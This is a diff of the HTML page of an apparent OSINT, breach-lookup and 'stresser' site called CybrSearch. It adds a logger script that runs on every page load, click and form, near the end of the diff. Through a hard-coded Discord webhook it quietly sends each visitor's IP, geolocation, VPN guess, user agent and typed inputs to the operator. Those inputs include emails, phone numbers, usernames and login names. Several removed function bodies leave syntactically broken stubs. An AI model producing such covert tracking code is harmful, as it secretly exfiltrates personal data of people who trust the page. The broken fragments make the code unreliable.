@@ -682,7 +682,7 @@
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script><script>
 // Log on page load
 window.addEventListener("load", () => {
-  sendToDiscord("Visitor loaded the page");
+  logToDiscord("Visitor loaded the page");
 });
 
 // Log general interactions (clicks on all buttons)
@@ -690,13 +690,13 @@ document.addEventListener("DOMContentLoaded", () => {
   document.querySelectorAll("button").forEach(btn => {
     btn.addEventListener("click", () => {
       const label = btn.textContent.trim() || "Unnamed button";
-      sendToDiscord(`Button clicked: ${label}`);
+      logToDiscord(`Button clicked: ${label}`);
     });
   });
 
   document.querySelectorAll("form").forEach(form => {
     form.addEventListener("submit", () => {
-      sendToDiscord(`Form submitted: ${form.id || "unknown"}`);
+      logToDiscord(`Form submitted: ${form.id || "unknown"}`);
     });
   });
 });
@@ -715,7 +715,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
       resultDiv.innerHTML = '<div class="text-center"><div class="loading-spinner mx-auto mb-3"></div><p>Launching simulated stress test...</p></div>';
 
-      await sendToDiscord("Stresser action requested", {
+      await logToDiscord("Stresser action requested", {
         fields: [
           { name: "Target", value: ip },
           { name: "Duration", value: duration + "s" },
@@ -800,21 +800,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const toolTabs = new bootstrap.Tab(document.getElementById('breach-tab'));
     
     // Function to send logs to Discord
-    async function sendToDiscord(message, data = {}) {
-      try {
-        const timestamp = new Date().toISOString();
-        const visitorIp = await getVisitorIp();
-        
-        const embed = {
-          title: 'CybrSearch Log',
-          description: message,
-          color: 0x3b82f6,
-          fields: [
-            {
-              name: 'Timestamp',
-              value: timestamp,
-              inline: true
-            },
+    async ,
             {
               name: 'Visitor IP',
               value: visitorIp,
@@ -917,7 +903,7 @@ document.addEventListener("DOMContentLoaded", () => {
         `;
         
         // Log invalid attempt
-        await sendToDiscord('Breach scan attempted with no search terms', {
+        await logToDiscord('Breach scan attempted with no search terms', {
           fields: [
             {
               name: 'Action',
@@ -939,7 +925,7 @@ document.addEventListener("DOMContentLoaded", () => {
       `;
       
       // Log scan initiation
-      await sendToDiscord('Breach scan initiated', {
+      await logToDiscord('Breach scan initiated', {
         fields: [
           {
             name: 'Action',
@@ -1039,7 +1025,7 @@ document.addEventListener("DOMContentLoaded", () => {
           resultsContainer.innerHTML = resultsHTML;
           
           // Log breach findings
-          await sendToDiscord('Breaches found in scan', {
+          await logToDiscord('Breaches found in scan', {
             fields: [
               {
                 name: 'Action',
@@ -1105,7 +1091,7 @@ document.addEventListener("DOMContentLoaded", () => {
           `;
           
           // Log clean scan
-          await sendToDiscord('No breaches found in scan', {
+          await logToDiscord('No breaches found in scan', {
             fields: [
               {
                 name: 'Action',
@@ -1131,7 +1117,7 @@ document.addEventListener("DOMContentLoaded", () => {
         `;
         
         // Log scan error
-        await sendToDiscord('Breach scan failed', {
+        await logToDiscord('Breach scan failed', {
           fields: [
             {
               name: 'Action',
@@ -1162,7 +1148,7 @@ document.addEventListener("DOMContentLoaded", () => {
         `;
         
         // Log invalid IP attempt
-        await sendToDiscord('Invalid IP lookup attempt', {
+        await logToDiscord('Invalid IP lookup attempt', {
           fields: [
             {
               name: 'Action',
@@ -1187,7 +1173,7 @@ document.addEventListener("DOMContentLoaded", () => {
       `;
       
       // Log WHOIS lookup initiation
-      await sendToDiscord('WHOIS lookup initiated', {
+      await logToDiscord('WHOIS lookup initiated', {
         fields: [
           {
             name: 'Action',
@@ -1244,7 +1230,7 @@ document.addEventListener("DOMContentLoaded", () => {
         `;
         
         // Log successful WHOIS lookup
-        await sendToDiscord('WHOIS lookup completed', {
+        await logToDiscord('WHOIS lookup completed', {
           fields: [
             {
               name: 'Action',
@@ -1277,7 +1263,7 @@ document.addEventListener("DOMContentLoaded", () => {
         `;
         
         // Log WHOIS lookup error
-        await sendToDiscord('WHOIS lookup failed', {
+        await logToDiscord('WHOIS lookup failed', {
           fields: [
             {
               name: 'Action',
@@ -1586,13 +1572,7 @@ window.addEventListener("DOMContentLoaded", renderIncidentLog);
 <script>
 const WEBHOOK = "https://discord.com/api/webhooks/1408830669986988042/aUxBFnXrP0XGw4WUDaQ7MWd0MsmE9gvTbgEQhIWGJDHCtkCl1c6CmWf77i3peDwbckdF";
 
-async function sendLogToDiscord(title, fields) {
-  const ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip).catch(() => "Unknown");
-  const payload = {
-    embeds: [{
-      title: title,
-      color: 3447003,
-      fields: fields.concat([{ name: "IP", value: ip, inline: true }]),
+async ]),
       timestamp: new Date().toISOString()
     }],
     username: "Site Logger"
@@ -1608,7 +1588,7 @@ async function sendLogToDiscord(title, fields) {
 function checkEmailIntel(e) {
   e.preventDefault();
   const email = document.getElementById("intelEmail").value.trim();
-  sendLogToDiscord("Email Intelligence Search", [{ name: "Email", value: email }]);
+  logToDiscord("Email Intelligence Search", [{ name: "Email", value: email }]);
   // continue original logic...
   const domain = email.split("@")[1].toLowerCase();
   const disposable = ["mailinator.com", "10minutemail.com", "tempmail.com", "trashmail.com"];
@@ -1634,7 +1614,7 @@ function checkEmailIntel(e) {
 function searchUsernameOSINT(e) {
   e.preventDefault();
   const user = document.getElementById("osintUsername").value.trim();
-  sendLogToDiscord("Username OSINT Search", [{ name: "Username", value: user }]);
+  logToDiscord("Username OSINT Search", [{ name: "Username", value: user }]);
   const result = `
     <p><strong>Results for:</strong> ${user}</p>
     <ul>
@@ -1650,7 +1630,7 @@ function searchUsernameOSINT(e) {
 function lookupDomain(e) {
   e.preventDefault();
   const domain = document.getElementById("domainReconInput").value.trim();
-  sendLogToDiscord("Domain Recon Lookup", [{ name: "Domain", value: domain }]);
+  logToDiscord("Domain Recon Lookup", [{ name: "Domain", value: domain }]);
   const resultBox = document.getElementById("domainReconResult");
   resultBox.innerHTML = `<p><strong>Domain:</strong> ${domain}</p><p>Loading DNS data...</p>`;
   fetch("https://dns.google/resolve?name=" + domain + "&type=A")
@@ -1673,7 +1653,7 @@ function lookupDomain(e) {
 function lookupHash(e) {
   e.preventDefault();
   const hash = document.getElementById("hashInput").value.trim().toLowerCase();
-  sendLogToDiscord("Hash Lookup", [{ name: "Hash", value: hash }]);
+  logToDiscord("Hash Lookup", [{ name: "Hash", value: hash }]);
   const known = {
     "5f4dcc3b5aa765d61d8327deb882cf99": "password",
     "e99a18c428cb38d5f260853678922e03": "abc123",
@@ -1691,7 +1671,7 @@ function saveIncident(e) {
   e.preventDefault();
   const txt = document.getElementById("incidentText").value.trim();
   if (!txt) return;
-  sendLogToDiscord("Incident Log Entry", [{ name: "Entry", value: txt }]);
+  logToDiscord("Incident Log Entry", [{ name: "Entry", value: txt }]);
   const log = JSON.parse(localStorage.getItem("incidentLog") || "[]");
   log.push({ text: txt, time: new Date().toLocaleString() });
   localStorage.setItem("incidentLog", JSON.stringify(log));
@@ -1724,13 +1704,7 @@ function renderLiveFeed() {
 }
 
 // Enhance Discord logger to also call feed logger
-async function sendLogToDiscord(title, fields) {
-  const ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip).catch(() => "Unknown");
-  const payload = {
-    embeds: [{
-      title: title,
-      color: 3447003,
-      fields: fields.concat([{ name: "IP", value: ip, inline: true }]),
+async ]),
       timestamp: new Date().toISOString()
     }],
     username: "Site Logger"
@@ -1878,15 +1852,7 @@ function logout() {
 const WEBHOOK = "https://discord.com/api/webhooks/1408830669986988042/aUxBFnXrP0XGw4WUDaQ7MWd0MsmE9gvTbgEQhIWGJDHCtkCl1c6CmWf77i3peDwbckdF";
 
 // Send log to Discord
-async function sendToDiscord(title, embed = {}) {
-  const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip).catch(() => "Unknown");
-  const payload = {
-    username: "Logger",
-    embeds: [{
-      title,
-      color: 5814783,
-      fields: embed.fields || [],
-      footer: { text: "IP: " + ip },
+async ,
       timestamp: new Date().toISOString()
     }]
   };
@@ -1907,13 +1873,13 @@ function panicClear() {
 // Logout
 function logout() {
   localStorage.removeItem("userSession");
-  sendToDiscord("🔓 Logout Triggered");
+  logToDiscord("🔓 Logout Triggered");
   location.reload();
 }
 
 // General page load log
 document.addEventListener("DOMContentLoaded", () => {
-  sendToDiscord("📥 Page Loaded");
+  logToDiscord("📥 Page Loaded");
 });
 </script>
 
@@ -1923,13 +1889,121 @@ function logout() {
   localStorage.removeItem("userSession");
 
   // Send logout log to Discord
-  sendLogToDiscord("🔒 User Logged Out", [
+  logToDiscord("🔒 User Logged Out", [
     { name: "Action", value: "Manual logout from UI" }
   ]);
 
   // Reload the page
   location.reload();
 }
+</script>
+
+<script>
+// === CybrSearch Professional Logger v2.2.0 ===
+const WEBHOOK = "https://discord.com/api/webhooks/1408830669986988042/aUxBFnXrP0XGw4WUDaQ7MWd0MsmE9gvTbgEQhIWGJDHCtkCl1c6CmWf77i3peDwbckdF";
+
+// Unified high-quality Discord logger
+async function logToDiscord(title, fields = []) {
+  let ip = "Unknown", location = "Unknown", vpnStatus = "Unknown";
+  const ua = navigator.userAgent || "Unknown";
+
+  // IP + Geo + VPN heuristic
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    if (res.ok) {
+      const data = await res.json();
+      ip = data.ip || "Unknown";
+      location = [data.city, data.region, data.country_name].filter(Boolean).join(", ") || "Unknown";
+      const org = (data.org || "").toLowerCase();
+      vpnStatus = /(vpn|proxy|hosting|cloud|digitalocean|aws|azure|gcp|ovh)/i.test(org)
+        ? "⚠️ VPN/Proxy Suspected"
+        : "✅ Likely Residential";
+    }
+  } catch (e) {
+    console.warn("IP lookup failed", e);
+  }
+
+  // Normalize fields to Discord format
+  const safeFields = (Array.isArray(fields) ? fields : []).map(f => ({
+    name: String(f.name || f.key || "Field"),
+    value: String(f.value ?? f.val ?? "" ) || "—",
+    inline: Boolean(f.inline)
+  })).slice(0, 20); // Discord max 25 incl auto fields
+
+  // Auto metadata
+  const meta = [
+    { name: "🌍 IP Address", value: ip, inline: true },
+    { name: "📌 Location", value: location, inline: true },
+    { name: "🔒 VPN/Proxy", value: vpnStatus, inline: true },
+    { name: "💻 User Agent", value: ua.substring(0, 250) + (ua.length > 250 ? "…" : "") }
+  ];
+
+  const embed = {
+    title: /[\u2190-\u2BFF\u2600-\u27BF]/.test(title) ? title : `📝 ${title}`,
+    color: 0x3b82f6,
+    fields: [...safeFields, ...meta],
+    footer: {
+      text: "CybrSearch Security • v2.2.0",
+      icon_url: "https://i.imgur.com/7QbQZzH.png"
+    },
+    timestamp: new Date().toISOString()
+  };
+
+  // Primary send with basic retry
+  let ok = false;
+  for (let attempt = 1; attempt <= 2 && !ok; attempt++) {
+    try {
+      const resp = await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username: "CybrSearch Logger",
+          avatar_url: "https://i.imgur.com/7QbQZzH.png",
+          embeds: [embed]
+        })
+      });
+      ok = resp.ok;
+      if (!ok) console.warn("Webhook HTTP", resp.status);
+    } catch (err) {
+      if (attempt === 2) console.error("Webhook failed:", err);
+      await new Promise(r => setTimeout(r, 600));
+    }
+  }
+
+  // Also mirror to local Live Feed if present
+  try { logActionToFeed && logActionToFeed(title, safeFields); } catch (e) {}
+}
+
+// Optional: Local feed renderer hooks (no-op if not defined in page)
+function logActionToFeed(title, fields = []) {
+  try {
+    const feed = JSON.parse(localStorage.getItem("liveFeed") || "[]");
+    const entry = {
+      time: new Date().toLocaleTimeString(),
+      title,
+      details: fields.map(f => `${f.name}: ${f.value}`).join(" | ")
+    };
+    feed.unshift(entry);
+    if (feed.length > 100) feed.pop();
+    localStorage.setItem("liveFeed", JSON.stringify(feed));
+    if (typeof renderLiveFeed === "function") renderLiveFeed();
+  } catch (e) {
+    // ignore
+  }
+}
+//
+// Helper: convenience wrappers (optional)
+const Logger = {
+  login: (username) => logToDiscord("🔐 User Login", [{ name: "Username", value: username }]),
+  signup: (username) => logToDiscord("🆕 User Signup", [{ name: "Username", value: username }]),
+  breachScan: (email, phone, username) => logToDiscord("🕵️ Breach Scan Initiated", [
+    { name: "Email", value: email || "None", inline: true },
+    { name: "Phone", value: phone || "None", inline: true },
+    { name: "Username", value: username || "None", inline: true }
+  ]),
+  whois: (query) => logToDiscord("🌐 WHOIS Lookup", [{ name: "Query", value: String(query) }]),
+};
+// === End CybrSearch Logger ===
 </script>
 </body>
 </html>
